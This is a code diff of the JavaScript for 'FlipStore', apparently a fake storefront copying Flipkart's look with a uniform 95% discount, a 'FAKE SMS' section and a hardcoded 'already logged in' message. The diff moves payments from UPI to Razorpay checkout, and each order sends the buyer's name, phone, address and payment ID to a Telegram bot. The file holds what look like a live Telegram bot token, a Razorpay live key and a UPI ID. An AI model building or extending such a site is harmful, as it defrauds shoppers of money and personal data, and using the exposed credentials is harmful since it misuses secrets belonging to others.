@@ -1,9 +1,16 @@
+console.log("FlipStore Script Loaded Successfully! v2.0"); // Debugging Line
+
 // --- CONFIGURATION ---
 const TELEGRAM_BOT_TOKEN = "6305172063:AAFHumurpK6wMV7K-6FZBg-DSKxwMuD4Vw0"; 
 const TELEGRAM_CHAT_ID = "1815847082"; 
 
+// --- RAZORPAY CONFIGURATION ---
+const RAZORPAY_KEY_ID = "rzp_live_RonN88BXEVP9eA"; 
+
 // --- UPI CONFIGURATION ---
 const UPI_ID = "gpay-11265399414@okbizaxis"; 
+const MERCHANT_NAME = "VR Shop";
+const MERCHANT_CODE = "BCR2DN5TWTE6VMRU";
 
 const products = [
     // --- Earbuds (Keywords: wireless, earbuds, isolated) ---
@@ -334,6 +341,26 @@ function getDiscountedPrice(price) {
     return Math.floor(price * 0.05); 
 }
 
+// --- UI UTILS ---
+function showToast(message) {
+    const box = document.getElementById('toast-box');
+    if (!box) return;
+    const toast = document.createElement('div');
+    toast.className = 'toast';
+    toast.innerHTML = `<i class="fas fa-info-circle" style="color:#2874f0"></i> ${message}`;
+    box.appendChild(toast);
+    setTimeout(() => { toast.remove(); }, 3000);
+}
+
+function showLoading() { 
+    const loader = document.getElementById('loading-overlay');
+    if(loader) loader.classList.remove('hidden'); 
+}
+function hideLoading() { 
+    const loader = document.getElementById('loading-overlay');
+    if(loader) loader.classList.add('hidden'); 
+}
+
 // 1. Render Categories
 function renderCategories() {
     const nav = document.getElementById('category-nav');
@@ -347,7 +374,7 @@ function renderCategories() {
         const img = cat === "All" ? "https://rukminim1.flixcart.com/flap/128/128/image/f15c02bfeb02d15d.png?q=100" : product.image; 
         
         return `
-            <div class="cat-item" onclick="filterByCategory('${cat}')">
+            <div class="cat-item" onclick="filterByCategory(this, '${cat}')">
                 <div class="cat-img-box">
                     <img src="${img}" class="cat-img">
                 </div>
@@ -358,7 +385,11 @@ function renderCategories() {
 }
 
 // 2. Filter Logic
-function filterByCategory(category) {
+function filterByCategory(element, category) {
+    // UI Update
+    document.querySelectorAll('.cat-item').forEach(el => el.classList.remove('active'));
+    if(element) element.classList.add('active');
+
     const title = document.getElementById('section-title');
     if(category === "All") {
         if(title) title.innerText = "Deals of the Day";
@@ -395,10 +426,12 @@ function renderProducts(productList = products) {
             <div class="discount-badge">95% OFF</div>
             <img src="${product.image}" class="product-img" loading="lazy">
             <div class="product-title">${product.name}</div>
+            
             <div class="product-rating-row">
                 <div class="rating-badge">${product.rating} <i class="fas fa-star"></i></div>
                 <span class="review-count">(${product.reviews})</span>
             </div>
+
             <div class="price-box">
                 <span class="new-price">₹${discPrice}</span>
                 <span class="old-price">₹${product.price}</span>
@@ -469,21 +502,19 @@ function showProductDetail(product) {
 // 5. Cart Functions
 function addToCart(product) {
     cart.push(product);
-    alert("Item added to cart!");
+    showToast(`${product.name} added to cart!`);
     updateCartCount();
 }
 
 function updateCartCount() {
-    const cartBtn = document.querySelector('.cart-btn');
-    let badge = cartBtn.querySelector('.cart-badge');
-    if(!badge) {
-        badge = document.createElement('span');
-        badge.className = 'cart-badge';
-        badge.style.cssText = "background: #ff6161; color: white; font-size: 10px; border-radius: 50%; padding: 2px 6px; position: absolute; top: 0; right: 0; margin-top: -5px; margin-right: -10px;";
-        cartBtn.style.position = 'relative';
-        cartBtn.appendChild(badge);
+    const badge = document.querySelector('.cart-badge');
+    if(badge) {
+        badge.innerText = cart.length;
+        badge.style.display = cart.length > 0 ? 'block' : 'none';
+        // Simple animation
+        badge.style.transform = 'scale(1.2)';
+        setTimeout(() => badge.style.transform = 'scale(1)', 200);
     }
-    badge.innerText = cart.length;
 }
 
 function openCart() {
@@ -572,6 +603,7 @@ function goHome() {
     if(homeView) homeView.style.display = 'block';
     if(timerSection) timerSection.style.display = 'block';
 
+    // Close modals
     closeModal();
     document.getElementById('successModal').style.display = 'none';
 
@@ -602,7 +634,7 @@ function sendToTelegram(message) {
     if(!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) return;
 
     const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
-    const data = { chat_id: TELEGRAM_CHAT_ID, text: message, parse_mode: 'Markdown' };
+    const data = { chat_id: TELEGRAM_CHAT_ID, text: message }; // Removed parse_mode markdown to avoid errors
 
     fetch(url, {
         method: 'POST',
@@ -618,7 +650,7 @@ function goToPayment() {
     const addr = document.getElementById('input-addr').value;
 
     if(!name || !phone || !pincode || !addr) {
-        alert("Please fill all required details");
+        showToast("Please fill all required details");
         return;
     }
 
@@ -635,73 +667,97 @@ function backToAddress() {
     document.getElementById('step-address').classList.remove('hidden');
 }
 
-// --- UPDATED PAYMENT PROCESS WITH UTR ---
-function processPayment() {
-    const upiLink = `upi://pay?pa=${UPI_ID}&pn=FlipStore&am=${currentPrice}&cu=INR`;
-    
-    // Redirect to UPI App
-    window.location.href = upiLink;
-
-    // After a delay, show the "Enter UTR" Modal instead of direct success
-    setTimeout(() => {
-        closeModal(); // Close checkout modal
-        
-        const successModal = document.getElementById('successModal');
-        const content = successModal.querySelector('.modal-content');
-        
-        // Show UTR Input Form
-        content.innerHTML = `
-            <div style="text-align: center; padding: 20px;">
-                <h3 style="margin-bottom: 10px; color: #2874f0;">Verify Payment</h3>
-                <p style="color: #666; font-size: 13px; margin-bottom: 20px;">
-                    Please complete the payment in your UPI app and enter the <b>12-digit UTR / Reference ID</b> below to confirm your order.
-                </p>
-                
-                <input type="text" id="utr-input" placeholder="Enter 12-digit UTR/Ref No." maxlength="12" 
-                    style="width: 100%; padding: 12px; border: 1px solid #ccc; border-radius: 4px; margin-bottom: 15px; text-align: center; font-size: 16px; letter-spacing: 1px;">
-                
-                <button onclick="verifyPayment()" style="width: 100%; background: #fb641b; color: white; border: none; padding: 12px; font-weight: bold; border-radius: 4px; cursor: pointer;">
-                    VERIFY & CONFIRM ORDER
-                </button>
-            </div>
-        `;
-        successModal.style.display = 'flex';
-    }, 5000); // Show popup after 5 seconds of clicking Pay
+// --- HELPER TO LOAD SCRIPT DYNAMICALLY ---
+function loadRazorpayScript(src) {
+    return new Promise((resolve) => {
+        const script = document.createElement("script");
+        script.src = src;
+        script.onload = () => resolve(true);
+        script.onerror = () => resolve(false);
+        document.body.appendChild(script);
+    });
 }
 
-function verifyPayment() {
-    const utrInput = document.getElementById('utr-input').value.trim();
-    
-    // Basic Validation: Check if it's 12 digits (Standard UPI UTR length)
-    if (utrInput.length !== 12 || isNaN(utrInput)) {
-        alert("Invalid UTR! Please enter a valid 12-digit transaction ID.");
-        return;
+// --- UPDATED RAZORPAY PAYMENT ---
+async function processRazorpayPayment() {
+    // 1. Check if script is loaded, if not load it
+    if (typeof Razorpay === 'undefined') {
+        showLoading();
+        // Try loading manually if not present
+        const res = await loadRazorpayScript("https://checkout.razorpay.com/v1/checkout.js");
+        if (!res) {
+            hideLoading();
+            showToast("Payment Gateway failed to load. Please check internet.");
+            return;
+        }
     }
+    
+    showLoading();
 
-    // If Valid, Process Order
-    completeOrder(utrInput);
+    // 2. Setup Options
+    var options = {
+        "key": RAZORPAY_KEY_ID, 
+        "amount": Math.round(currentPrice * 100), // Ensure integer paise
+        "currency": "INR",
+        "name": "FlipStore",
+        "description": isCartOrder ? "Bulk Order" : currentProduct.name,
+        "image": "https://rukminim1.flixcart.com/www/800/800/promos/16/05/2019/d438a32e-765a-4d8b-b4a6-520b560971e8.png?q=90",
+        "handler": function (response) {
+            hideLoading();
+            completeOrder(response.razorpay_payment_id);
+        },
+        "prefill": {
+            "name": window.userDetails.name || "",
+            "contact": window.userDetails.phone || ""
+        },
+        "theme": {
+            "color": "#2874f0"
+        },
+        "modal": {
+            "ondismiss": function() {
+                hideLoading();
+                console.log('Checkout form closed');
+            }
+        }
+    };
+
+    // 3. Open Razorpay
+    try {
+        var rzp1 = new Razorpay(options);
+        rzp1.on('payment.failed', function (response){
+            hideLoading();
+            alert("Payment Failed: " + response.error.description);
+        });
+        
+        closeModal();
+        rzp1.open();
+    } catch (e) {
+        hideLoading();
+        console.error("Razorpay Init Error:", e);
+        showToast("Something went wrong with Payment Gateway.");
+    }
 }
 
-function completeOrder(utr) {
+function completeOrder(paymentId) {
     if(isCartOrder) { 
         cart = []; 
         updateCartCount(); 
     }
     
-    // 1. Send Telegram Message with UTR
-    let productDetails = isCartOrder ? `🛒 *BULK ORDER*` : `🛒 *Product:* ${currentProduct.name}`;
+    // 1. Send Telegram Message with Razorpay ID
+    let productDetails = isCartOrder ? `BULK ORDER` : `${currentProduct.name}`;
     const orderDetails = `
-✅ *ORDER CONFIRMED* ✅
+NEW ORDER CONFIRMED (Razorpay)
 -------------------------
-👤 *Name:* ${window.userDetails.name}
-📱 *Phone:* ${window.userDetails.phone}
-📮 *Pin:* ${window.userDetails.pincode}
-🏠 *Address:* ${window.userDetails.addr}
+Name: ${window.userDetails.name}
+Phone: ${window.userDetails.phone}
+Pin: ${window.userDetails.pincode}
+Address: ${window.userDetails.addr}
 -------------------------
-${productDetails}
-💰 *Amount:* ₹${currentPrice}
+Product: ${productDetails}
+Amount: ₹${currentPrice}
 -------------------------
-🆔 *UTR/Ref:* ${utr}
+Payment ID: ${paymentId}
     `;
     sendToTelegram(orderDetails);
 
@@ -716,9 +772,11 @@ ${productDetails}
             <div style="font-size: 50px; color: #388e3c; margin-bottom: 20px;"><i class="fas fa-check-circle"></i></div>
             <h2 style="color: #212121;">Order Confirmed!</h2>
             <p style="color: #666; margin-bottom: 20px;">Thank you for shopping with us.</p>
+            <p style="font-size: 12px; color: #888;">Transaction ID: ${paymentId}</p>
             <button onclick="closeSuccessAndHome()" style="width: 100%; background: #2874f0; color: white; border: none; padding: 12px; margin-top: 10px; cursor: pointer; border-radius: 2px;">Continue Shopping</button>
         </div>
     `;
+    successModal.style.display = 'flex';
 }
 
 // --- FAKE SMS ---
@@ -770,7 +828,7 @@ document.addEventListener('DOMContentLoaded', () => {
     const viewAllBtn = document.querySelector('.view-all');
     if(viewAllBtn) {
         viewAllBtn.addEventListener('click', () => {
-            filterByCategory('All');
+            filterByCategory(null, 'All');
         });
     }
 
@@ -778,10 +836,10 @@ document.addEventListener('DOMContentLoaded', () => {
     if(cartBtn) cartBtn.addEventListener('click', (e) => { e.preventDefault(); openCart(); });
 
     const loginBtn = document.querySelector('.login-btn');
-    if(loginBtn) loginBtn.addEventListener('click', () => { alert("You are already logged in!"); goHome(); });
+    if(loginBtn) loginBtn.addEventListener('click', () => { showToast("You are already logged in!"); goHome(); });
 
     const sellerBtn = Array.from(document.querySelectorAll('.nav-links a')).find(el => el.innerText.includes('Become a Seller'));
-    if(sellerBtn) sellerBtn.addEventListener('click', (e) => { e.preventDefault(); alert("Aap eligible nahi hai"); });
+    if(sellerBtn) sellerBtn.addEventListener('click', (e) => { e.preventDefault(); showToast("Aap eligible nahi hai"); });
 
     // Search
     const searchInput = document.querySelector('.search-bar input');
@@ -793,4 +851,3 @@ document.addEventListener('DOMContentLoaded', () => {
         });
     }
 });
-
